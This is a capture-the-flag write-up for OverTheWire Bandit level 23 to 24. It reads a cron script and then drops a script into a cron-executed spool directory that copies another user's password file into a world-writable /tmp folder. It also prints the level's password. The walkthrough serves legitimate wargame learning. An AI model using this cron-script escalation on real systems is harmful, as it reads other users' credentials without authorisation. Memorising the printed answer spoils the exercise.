# CTF Write-Up: [Level 23 → 24](https://overthewire.org/wargames/bandit/bandit24.html)

> **Platform:** OverTheWire | **Type:** Bandit

---

## 🚩 Password for Next Level

<details>
<summary>bandit24</summary>

`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

</details>

---

## Challenge

A cron job runs every minute as `bandit24`, executing and then deleting any scripts placed in `/var/spool/bandit24/foo` that are owned by `bandit23`. Drop in a script to read the password on our behalf.

---

## Solution

```bash
ls /etc/cron.d/
```

```
behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  ...
```

```bash
cat /etc/cron.d/cronjob_bandit24
```

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

```bash
cat /usr/bin/cronjob_bandit24.sh
```

```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit

echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

The script executes any file in `/var/spool/bandit24/foo` owned by `bandit23`, then deletes it. Set up an output directory, write a script that copies the password there, and wait for cron to run it:

```bash
mkdir -p /tmp/shell_script
chmod 777 /tmp/shell_script
```

```bash
cat > /tmp/shell_script/pass.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/shell_script/pass.txt
EOF

chmod +x /tmp/shell_script/pass.sh
cp /tmp/shell_script/pass.sh /var/spool/bandit24/foo/
```

Wait up to a minute, then:

```bash
cat /tmp/shell_script/pass.txt
```

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

Log into the next level:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

---

*Bandit Level 23 → 24 — OverTheWire | Completed ✅*
